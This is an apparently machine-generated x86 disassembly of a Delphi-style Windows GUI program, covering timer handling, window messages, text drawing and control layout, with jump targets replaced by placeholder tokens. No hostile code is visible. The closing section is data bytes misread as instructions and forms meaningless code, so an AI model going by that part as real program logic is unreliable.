mov eax [ eax + 0x48 ]
push eax
push 0x1
mov ecx 0x1
xor edx edx
mov eax [ ebp - 0xc ]
call sub_4370a0
pop ecx
jmp r-xdata
push ebp
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x48 ]
push edx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4c ]
sub eax 0x2
push eax
mov ecx eax
xor edx edx
mov eax [ ebp - 0x8 ]
call sub_4370a0
pop ecx
push ebp
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x48 ]
push edx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4c ]
dec eax
push eax
mov ecx eax
xor edx edx
mov eax [ ebp - 0xc ]
call sub_4370a0
pop ecx
jmp r-xdata
push ebp
push 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4c ]
push eax
xor ecx ecx
xor edx edx
mov eax [ ebp - 0x8 ]
call sub_4370a0
pop ecx
push ebp
push 0x1
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4c ]
push eax
xor ecx ecx
mov edx 0x1
mov eax [ ebp - 0xc ]
call sub_4370a0
pop ecx
jmp r-xdata
push ebp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
sub eax 0x2
push eax
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
push edx
mov edx eax
xor ecx ecx
mov eax [ ebp - 0x8 ]
call sub_4370a0
pop ecx
push ebp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
dec eax
push eax
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
push edx
mov edx eax
xor ecx ecx
mov eax [ ebp - 0xc ]
call sub_4370a0
pop ecx
sub_437368
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_41e1a4
mov [ esi + 0x40 ] 0x1
mov [ esi + 0x30 ] 0x3e8
push esi
push sub_4373f0
call sub_41f2e4
mov [ esi + 0x34 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403a24
mov eax esi
pop esi
pop ebx
retn
call sub_403a7c
pop [ fs : 0x0 ]
add esp 0xc
sub_4373b8
push ebx
push esi
call sub_403a8c
mov ebx edx
mov esi eax
mov [ esi + 0x40 ] 0x0
mov eax esi
call sub_437464
mov eax [ esi + 0x34 ]
call sub_41f398
mov edx ebx
and dl 0xfc
mov eax esi
call sub_41e1f0
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403a74
sub_4373f0
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov esi [ ebx ]
cmp esi 0x113
jne r-xdata
mov eax [ ebx + 0x8 ]
push eax
mov eax [ ebx + 0x4 ]
push eax
push esi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
push eax
call DefWindowProcA
mov [ ebx + 0xc ] eax
xor eax eax
push ebp
push sub_43742a
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov si 0xffef
call sub_4038bc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_437464
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov ebx eax
xor eax eax
push ebp
push sub_4374e3
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x1
mov eax [ ebx + 0x34 ]
push eax
call KillTimer
mov esi [ ebx + 0x30 ]
test esi esi
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4374ea
lea eax [ ebp - 0x4 ]
call sub_40442c
retn
cmp [ ebx + 0x40 ] 0x0
je r-xdata
cmp [ ebx + 0x3a ] 0x0
je r-xdata
push 0x0
push esi
push 0x1
mov eax [ ebx + 0x34 ]
push eax
call SetTimer
test eax eax
jne r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_406660
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bfa0
call sub_403e8c
sub_43753c
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_449fd8
mov eax [ r-xdata ]
mov [ esi + 0x50 ] eax
mov edx 0xb9
mov eax esi
call sub_441520
mov edx 0x29
mov eax esi
call sub_441544
mov [ esi + 0x21f ] 0x2
mov dl 0x2
mov eax esi
call sub_437948
mov edx 0x1
mov eax esi
call sub_437964
mov [ esi + 0x21c ] 0x0
mov edx 0x8000000f
mov eax esi
call sub_441f04
mov [ esi + 0x21d ] 0x1
mov dl 0x1
mov eax esi
call sub_448718
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403a24
mov eax esi
pop esi
pop ebx
retn
call sub_403a7c
pop [ fs : 0x0 ]
add esp 0xc
sub_4375d4
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_4453e0
xor eax eax
mov al [ ebx + 0x21c ]
mov eax [ eax * 4 + rw-data ]
or [ esi + 0x4 ] eax
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
and [ esi + 0x24 ] 0xfffffffc
pop esi
pop ebx
retn
cmp [ ebx + 0x1a5 ] 0x0
je r-xdata
cmp [ ebx + 0x21c ] 0x1
jne r-xdata
and [ esi + 0x4 ] 0xff7fffff
or [ esi + 0x8 ] 0x200
sub_437644
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_447ae8
pop esi
pop ebx
retn
cmp [ ebx + 0x21c ] 0x1
jne r-xdata
mov eax ebx
call sub_445ac0
sub_437684
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x14 ] ecx
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_437774
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x21d ] 0x0
jne r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
jmp r-xdata
lea edx [ ebp - 0x14 ]
mov eax ebx
call sub_441d64
cmp [ ebp - 0x14 ] 0x0
je r-xdata
mov edx edi
mov eax ebx
call sub_4469c4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43777b
lea eax [ ebp - 0x14 ]
call sub_40442c
retn
mov esi [ ebx + 0x218 ]
cmp [ ebx + 0x211 ] 0x0
je r-xdata
cmp [ ebx + 0x212 ] 0x0
je r-xdata
add esi [ ebx + 0x214 ]
test esi esi
jle r-xdata
add esi [ ebx + 0x214 ]
mov eax [ ebx + 0x48 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebx + 0x4c ]
mov [ ebp - 0x4 ] eax
mov eax [ edi + 0x8 ]
mov eax [ eax + 0x10 ]
cmp eax [ ebp - 0x8 ]
je r-xdata
mov eax [ edi + 0x8 ]
mov eax [ eax + 0x14 ]
cmp eax [ ebp - 0x4 ]
je r-xdata
xor eax eax
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x8 ]
sub eax esi
dec eax
mov [ ebp - 0x10 ] eax
push 0xffffffff
lea eax [ ebp - 0x10 ]
push eax
mov eax ebx
call sub_448484
push eax
call InvalidateRect
xor eax eax
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x4 ]
sub eax esi
dec eax
mov [ ebp - 0xc ] eax
push 0xffffffff
lea eax [ ebp - 0x10 ]
push eax
mov eax ebx
call sub_448484
push eax
call InvalidateRect
sub_437784
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] 0x80000014
cmp al 0x1
jne r-xdata
mov edx [ ebp + 0x8 ]
mov [ edx - 0x8 ] 0x80000010
cmp al 0x1
jne r-xdata
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] 0x80000010
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov [ eax - 0x8 ] 0x80000014
sub_4377bc
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x1c ] edx
mov ebx eax
xor eax eax
push ebp
push sub_437905
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x18 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov al [ ebx + 0x212 ]
test al al
je r-xdata
mov eax [ ebx + 0x70 ]
push eax
mov edx [ ebx + 0x218 ]
push edx
lea edx [ ebp - 0x18 ]
mov ecx eax
mov eax [ ebx + 0x208 ]
call sub_4368f4
mov al [ ebx + 0x211 ]
test al al
je r-xdata
push ebp
call sub_437784
pop ecx
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebx + 0x214 ]
push eax
lea edx [ ebp - 0x18 ]
mov ecx [ ebp - 0x4 ]
mov eax [ ebx + 0x208 ]
call sub_4368f4
mov esi [ ebx + 0x208 ]
mov edx [ ebx + 0x70 ]
mov eax [ esi + 0x14 ]
call sub_421ce0
lea edx [ ebp - 0x18 ]
mov eax esi
call sub_422084
mov dl 0x1
mov eax [ esi + 0x14 ]
call sub_421dfc
mov edx [ ebx + 0x68 ]
mov eax esi
call sub_422408
mov edx r-xdata
mov eax esi
call sub_422364
mov edx [ ebp - 0xc ]
add edx [ ebp - 0x14 ]
sub edx eax
sar edx 0x1
jns r-xdata
push ebp
call sub_437784
pop ecx
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebx + 0x214 ]
push eax
lea edx [ ebp - 0x18 ]
mov ecx [ ebp - 0x4 ]
mov eax [ ebx + 0x208 ]
call sub_4368f4
mov [ ebp - 0x14 ] edx
add eax edx
mov [ ebp - 0xc ] eax
xor eax eax
mov al [ ebx + 0x21f ]
mov edi [ eax * 4 + rw-data ]
or edi 0x44
mov edx edi
mov eax ebx
call sub_444060
mov edi eax
push edi
lea eax [ ebp - 0x18 ]
push eax
push 0xffffffff
lea edx [ ebp - 0x1c ]
mov eax ebx
call sub_441d64
mov eax [ ebp - 0x1c ]
call sub_4048dc
push eax
mov eax esi
call sub_4224e8
push eax
call DrawTextA
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43790c
lea eax [ ebp - 0x1c ]
call sub_40442c
retn
adc edx 0x0
sub_4379b8
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_4445d4
mov eax [ ebx + 0x218 ]
neg eax
push eax
mov edx [ ebx + 0x218 ]
neg edx
push eax
push esi
call InflateRect
xor eax eax
cmp [ ebx + 0x212 ] 0x0
je r-xdata
cmp [ ebx + 0x211 ] 0x0
je r-xdata
add eax [ ebx + 0x214 ]
mov edx eax
neg edx
push edx
neg eax
push edx
push esi
call InflateRect
pop esi
pop ebx
retn
add eax [ ebx + 0x214 ]
sub_437a10
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x5c ] 0x0
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_44717c
mov eax [ ebp - 0x4 ]
mov [ eax + 0x210 ] 0x1
xor edx edx
push ebp
push sub_437b31
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
lea esi [ eax + 0x44 ]
lea edi [ ebp - 0x18 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x5b ]
dec al
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x4c ] 0x0
jne r-xdata
dec al
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_44717c
call sub_403f38
jmp r-xdata
mov edx [ ebp - 0xc ]
sub edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_441544
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x4c ] 0x0
jne r-xdata
dec al
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0xc ]
sub eax [ ebp - 0x14 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x48 ]
push edx
push eax
mov edx [ ebp - 0x4 ]
mov ecx [ edx + 0x44 ]
sub ecx eax
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x40 ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x48 ] 0x0
jne r-xdata
dec al
je r-xdata
mov edx [ ebp - 0x10 ]
sub edx [ ebp - 0x18 ]
mov eax [ ebp - 0x4 ]
call sub_441520
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x48 ] 0x0
jne r-xdata
jmp r-xdata
mov eax [ ebp - 0x10 ]
sub eax [ ebp - 0x18 ]
push eax
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
push edx
mov edx [ ebp - 0x4 ]
mov ecx [ edx + 0x44 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x40 ]
sub edx eax
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
jmp r-xdata
sub_437b4c
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
cmp [ ebx + 0x210 ] 0x0
jne r-xdata
xor eax eax
jmp r-xdata
mov ecx edi
mov edx esi
mov eax ebx
call sub_448fcc
test al al
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov al 0x1
sub_437cdc
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
mov ecx esi
xor edx edx
mov eax edi
call sub_433ebc
mov edx edi
mov eax [ esi + 0x210 ]
call sub_416044
xor edx edx
mov eax edi
call sub_441c84
mov eax esi
mov edx [ eax ]
call [ edx + 0x50 ]
mov edx eax
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x64 ]
xor edx edx
mov eax edi
call sub_441ed8
mov [ edi + 0x124 ] esi
mov [ edi + 0x120 ] sub_43810c
mov edx esi
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x68 ]
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403a24
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_403a7c
pop [ fs : 0x0 ]
add esp 0xc
sub_437d60
push ebx
push esi
call sub_403a8c
mov ebx edx
mov esi eax
mov eax [ esi + 0x4 ]
mov eax [ eax + 0x210 ]
mov edx esi
call sub_416340
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4443b8
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403a74
sub_437d98
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x218 ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov [ eax + 0x218 ] 0x1
xor eax eax
push ebp
push sub_437dfd
push [ fs : eax ]
mov [ fs : eax ] esp
mov si [ ebx + 0x6 ]
test si si
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
mov edx [ eax ]
call [ edx + 0xc8 ]
test al al
je r-xdata
cmp si 0x5
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_4341bc
mov eax [ ebp - 0x4 ]
mov [ eax + 0x218 ] 0x0
sub_437e02
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
call sub_461f40
call sub_403f08
mov eax [ ebp - 0x4 ]
mov [ eax + 0x218 ] 0x0
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_437e28
push ebx
push esi
push edi
mov ebx edx
mov edi eax
mov edx ebx
mov eax edi
call sub_4474b4
mov edx ebx
mov eax [ edi + 0x30 ]
mov si 0xffba
call sub_4038bc
cmp [ ebx ] 0x8
je r-xdata
mov eax [ edi + 0x30 ]
mov edx [ eax ]
call [ edx + 0xc8 ]
test al al
jne r-xdata
cmp [ ebx ] 0x20
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov [ ebx ] 0x0
sub_437e68
push ebx
push esi
push ecx
mov [ esp ] cl
mov esi edx
mov ebx eax
mov edx esi
mov cl [ esp ]
mov eax ebx
call sub_447314
mov edx esi
mov cl [ esp ]
mov eax [ ebx + 0x30 ]
mov si 0xffbc
call sub_4038bc
pop edx
pop esi
pop ebx
retn
sub_437e94
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_43107c
mov eax [ r-xdata ]
mov [ ebx + 0x50 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403690
mov [ ebx + 0x210 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403690
mov esi eax
mov [ ebx + 0x214 ] esi
mov [ esi + 0x24 ] ebx
mov [ esi + 0x20 ] sub_438144
mov [ ebx + 0x218 ] 0xffffffff
mov [ ebx + 0x21c ] 0x1
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_403a24
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_403a7c
pop [ fs : 0x0 ]
add esp 0xc
sub_437f24
push ebx
push esi
call sub_403a8c
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_4381b8
mov eax [ esi + 0x214 ]
xor edx edx
mov [ eax + 0x20 ] edx
mov [ eax + 0x24 ] edx
call sub_4036c0
mov eax [ esi + 0x210 ]
call sub_4036c0
mov edx ebx
and dl 0xfc
mov eax esi
call sub_44a034
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403a74
sub_437f74
push ebp
mov ebp esp
add esp 0xffffffa8
push ebx
push esi
push edi
mov ebx eax
mov eax [ ebx + 0x210 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ ebx + 0x220 ] 0x0
jne r-xdata
push 0x0
call GetDC
mov esi eax
mov eax [ ebx + 0x68 ]
call sub_421528
push eax
push esi
call SelectObject
mov edi eax
lea eax [ ebp - 0x58 ]
push eax
push esi
call GetTextMetricsA
push edi
push esi
call SelectObject
push esi
push 0x0
call ReleaseDC
mov eax [ ebx + 0x210 ]
mov esi [ eax + 0x8 ]
mov eax esi
mov ecx [ ebx + 0x21c ]
add eax ecx
dec eax
cdq
idiv ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebx + 0x48 ]
sub eax 0xa
cdq
idiv ecx
mov [ ebp - 0x8 ] eax
mov eax [ ebx + 0x4c ]
mov ecx [ ebp - 0x58 ]
sub eax ecx
sub eax 0x5
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
cdq
idiv [ ebp - 0x4 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x14 ]
cdq
idiv [ ebp - 0x4 ]
sar edx 0x1
jns r-xdata
inc ecx
add edx ecx
mov [ ebp - 0x10 ] edx
push esi
call BeginDeferWindowPos
mov [ ebp - 0x18 ] eax
xor eax eax
push ebp
push sub_4380fd
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0x210 ]
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
adc edx 0x0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x18 ]
push eax
call EndDeferWindowPos
retn
inc eax
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x14 ] 0x0
push 0x14
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x14 ]
cdq
idiv [ ebp - 0x4 ]
imul edx [ ebp - 0xc ]
add edx [ ebp - 0x10 ]
push edx
mov eax [ ebp - 0x1c ]
push eax
push 0x0
mov eax edi
call sub_448484
push eax
mov eax [ ebp - 0x18 ]
push eax
call DeferWindowPos
mov [ ebp - 0x18 ] eax
mov dl 0x1
mov eax edi
call sub_441c84
inc [ ebp - 0x14 ]
dec [ ebp - 0x20 ]
jne r-xdata
mov eax ebx
call sub_441768
sub eax [ ebp - 0x1c ]
sub eax [ ebp - 0x8 ]
mov [ ebp - 0x1c ] eax
mov eax [ ebx + 0x210 ]
mov edx [ ebp - 0x14 ]
call sub_4161a0
mov edi eax
mov dl [ ebx + 0x5f ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x70 ]
mov eax [ ebp - 0x14 ]
cdq
idiv [ ebp - 0x4 ]
imul [ ebp - 0x8 ]
add eax 0x8
mov [ ebp - 0x1c ] eax
mov eax edi
mov si 0xffc8
call sub_4038bc
test al al
je r-xdata
sub_43810c
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x221 ] 0x0
jne r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x210 ]
call sub_4161fc
mov [ ebx + 0x218 ] eax
mov eax ebx
call sub_441970
mov eax ebx
mov si 0xffeb
call sub_4038bc
sub_438144
push ebx
mov ebx eax
cmp [ ebx + 0x220 ] 0x0
jne r-xdata
pop ebx
retn
mov eax [ ebx + 0x214 ]
mov edx [ eax ]
call [ edx + 0x14 ]
cmp eax [ ebx + 0x218 ]
jg r-xdata
mov eax ebx
call sub_4382bc
mov eax [ ebx + 0x214 ]
mov edx [ eax ]
call [ edx + 0x14 ]
dec eax
mov [ ebx + 0x218 ] eax
sub_4381b8
push ebx
push esi
push edi
mov esi edx
mov ebx eax
jmp r-xdata
mov eax [ ebx + 0x210 ]
cmp esi [ eax + 0x8 ]
jg r-xdata
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_437cdc
jmp r-xdata
mov edi [ ebx + 0x210 ]
cmp esi [ edi + 0x8 ]
jl r-xdata
mov eax edi
call sub_416288
call sub_4036c0
pop edi
pop esi
pop ebx
retn
sub_4381f8
push ebx
mov ebx eax
cmp edx 0x1
jge r-xdata
cmp edx 0x10
jle r-xdata
mov edx 0x1
cmp edx [ ebx + 0x21c ]
je r-xdata
mov edx 0x10
pop ebx
retn
mov [ ebx + 0x21c ] edx
mov eax ebx
call sub_437f74
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
sub_438230
push ebx
push esi
push edi
push ebp
mov esi edx
mov ebx eax
cmp [ ebx + 0x220 ] 0x0
je r-xdata
cmp esi 0xffffffff
jge r-xdata
mov [ ebx + 0x218 ] esi
jmp r-xdata
mov ebp [ ebx + 0x210 ]
mov eax [ ebp + 0x8 ]
cmp esi eax
jl r-xdata
or esi 0xffffffff
pop ebp
pop edi
pop esi
pop ebx
retn
mov edi [ ebx + 0x218 ]
cmp esi edi
je r-xdata
mov esi eax
dec esi
test edi edi
jl r-xdata
mov edi esi
mov [ ebx + 0x218 ] edi
test edi edi
jl r-xdata
mov edx edi
mov eax ebp
call sub_4161a0
xor edx edx
mov ecx [ eax ]
call [ ecx + 0xc8 ]
mov edx edi
mov eax [ ebx + 0x210 ]
call sub_4161a0
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0xc8 ]
sub_4382bc
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x8 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_438385
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0x214 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov edx eax
mov eax ebx
call sub_4381b8
mov eax [ ebx + 0x210 ]
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
cmp [ ebx + 0x218 ] 0x0
jl r-xdata
inc eax
mov [ ebp - 0x4 ] eax
xor esi esi
mov eax ebx
call sub_437f74
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43838c
lea eax [ ebp - 0x8 ]
call sub_40442c
retn
mov [ ebx + 0x221 ] 0x1
mov edx [ ebx + 0x218 ]
mov eax [ ebx + 0x210 ]
call sub_4161a0
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0xc8 ]
mov [ ebx + 0x221 ] 0x0
lea ecx [ ebp - 0x8 ]
mov edx esi
mov eax [ ebx + 0x214 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ ebp - 0x8 ]
push eax
mov edx esi
mov eax [ ebx + 0x210 ]
call sub_4161a0
pop edx
call sub_441d94
inc esi
dec [ ebp - 0x4 ]
jne r-xdata
sub_438394
push ebx
push esi
push edi
mov ebx eax
mov eax ebx
call sub_4479bc
mov eax [ ebx + 0x210 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
pop edi
pop esi
pop ebx
retn
inc esi
xor edi edi
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
push eax
mov edx edi
mov eax [ ebx + 0x210 ]
call sub_4161a0
pop edx
mov ecx [ eax ]
call [ ecx + 0x64 ]
inc edi
dec esi
jne r-xdata
sub_438408
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_43842d
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_438434
retn
sub_43845c
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_438481
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_438488
retn
sub_438da5
lea eax [ ebx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
dec eax
mov es [ ebx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
xor [ esi - 0x71c7ffbd ] cl
inc ebx
add [ eax + eax ] dh
add [ esp + eax * 4 - 0x16ebffbd ] dl
inc ecx
add [ ecx + edi ] dl
inc eax
add [ eax - 0x1e ] ch
inc ecx
add [ ecx + edi ] bl
inc eax
add [ eax ] al
xchg ebp eax
inc ebx
add [ eax + 0x36 ] bl
inc eax
add [ esi + esi + 0x40 ] dh
add [ ecx ] bh
inc ebx
add [ eax + 0x6b ] ch
inc ecx
add [ 0x6a840041 ] bl
inc ecx
add ah dh
in eax 0x41
add al al
in al 0x41
add [ esi ] al
inc ecx
add ah bh
out 0x41 al
add [ ecx + ebp * 8 ] ch
inc ecx
add [ esi ] dl
inc ecx
add [ esi ] cl
inc ecx
add [ ecx + ebp * 8 ] dh
inc ecx
add al ch
mov al [ 0xffffffffa16c0043 ]
inc ebx
add al bl
xchg esp eax
inc ebx
add al dl
xchg ebp eax
inc ebx
add [ edx + 0x43 ] ah
add [ ecx ] al
add ch ch
jmp [ eax + 0xb0043a1 ]
sub_438e39
push esp
inc esi
outsd
outsb
je r-xdata
add al 0x46
imul esp [ ecx + 0x6c ] 0x8e48676f
inc ebx
add [ edi ] al
or edx [ esi + eax * 2 + 0x6f ]
outsb
je r-xdata
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
or [ eax ] al
or ecx [ ebp + 0x69 ]
outsb
lea eax [ ebx ]
pop esp
add [ eax ] al
[ eax + eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
pop es
add [ esi ] al
inc esp
jbe r-xdata
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
outsd
outsb
je r-xdata
imul esp [ ecx + 0x6c ] 0x8df0676f
inc ebx
add [ eax - 0x7b ] dl
inc ebx
add [ eax + eax ] cl
pop es
inc esp
imul esp [ ecx + 0x6c ] 0x673676f
add ah ah
cld
inc ecx
add [ eax ] bl
add bh bh
adc [ ebx + eax * 2 + 0x100 ] ah
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x46040006 ] al
pushad
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f07000b ] al
outsb
inc ecx
jo r-xdata
imul edi [ edx + 0x65 ] r-xdata
insb
add [ eax ] al
[ eax + eax ]
dec edi
jo r-xdata
arpl [ ebp + 0x54 ] sp
adc [ eax ] al
push 0x68ff0000
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4d0b0008 ] al
imul ebp [ esi + 0x46 ] 0x53746e6f
add [ esi ] dl
inc ecx
add [ esi ] cl
inc ecx
add [ ecx + ebp * 8 ] dh
inc ecx
add [ esp + edx * 4 + 0x43 ] bl
add [ ebp + edx * 4 - 0x6b27ffbd ] al
inc ebx
add al dl
xchg ebp eax
inc ebx
add al ch
cmpsb [ esi ] [ edi ]
inc ebx
add [ ebx ] dl
push esp
push eax
jb r-xdata
insb
jns r-xdata
add [ eax + 0x6b ] ch
imul ebp [ edi + 0x6e ] 0x438d7473
add [ eax ] ah
add bh bh
outsb
dec esi
js r-xdata
outsb
je r-xdata
inc esi
outsd
outsb
je r-xdata
inc ecx
add [ 0x6a840041 ] bl
inc ecx
add ah dh
in eax 0x41
add al al
in al 0x41
add [ esi ] al
inc ecx
add ah bh
